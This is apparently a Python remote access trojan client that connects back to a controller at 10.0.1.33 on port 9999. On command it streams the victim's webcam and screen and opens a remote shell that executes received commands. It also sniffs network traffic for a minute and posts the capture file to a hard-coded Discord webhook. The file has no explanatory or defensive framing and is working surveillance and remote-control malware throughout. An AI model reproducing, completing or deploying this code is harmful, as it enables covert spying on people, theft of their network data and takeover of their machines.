import socket
import cv2
import pyautogui
import numpy as np
import scapy.all as scapy
import threading
import requests
import subprocess

def webcam_stream(client_socket):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        client_socket.sendall(buffer.tobytes())

def screen_stream(client_socket):
    while True:
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        _, buffer = cv2.imencode('.jpg', frame)
        client_socket.sendall(buffer.tobytes())

def sniffer_start():
    def sniff_and_save(pkt):
        scapy.wrpcap('target.cap', pkt, append=True)
    
    iface = scapy.conf.iface
    scapy.sniff(iface=iface, timeout=60, prn=sniff_and_save)

    webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
    with open('target.cap', 'rb') as f:
        requests.post(webhook_url, files={'file': f})

def shell(client_socket):
    while True:
        command = client_socket.recv(1024).decode('utf-8')
        if command.lower() == "exit":
            break
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = e.output
        if not output:
            output = "Command executed, but no output."
        client_socket.send(output.encode('utf-8'))

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('10.0.1.33', 9999))

    while True:
        command = client_socket.recv(1024).decode('utf-8')
        if command == "webcam_stream":
            webcam_thread = threading.Thread(target=webcam_stream, args=(client_socket,))
            webcam_thread.start()
        elif command == "screen_stream":
            screen_thread = threading.Thread(target=screen_stream, args=(client_socket,))
            screen_thread.start()
        elif command == "sniffer_start":
            sniffer_thread = threading.Thread(target=sniffer_start)
            sniffer_thread.start()
        elif command == "shell":
            shell(client_socket)

if __name__ == "__main__":
    main()
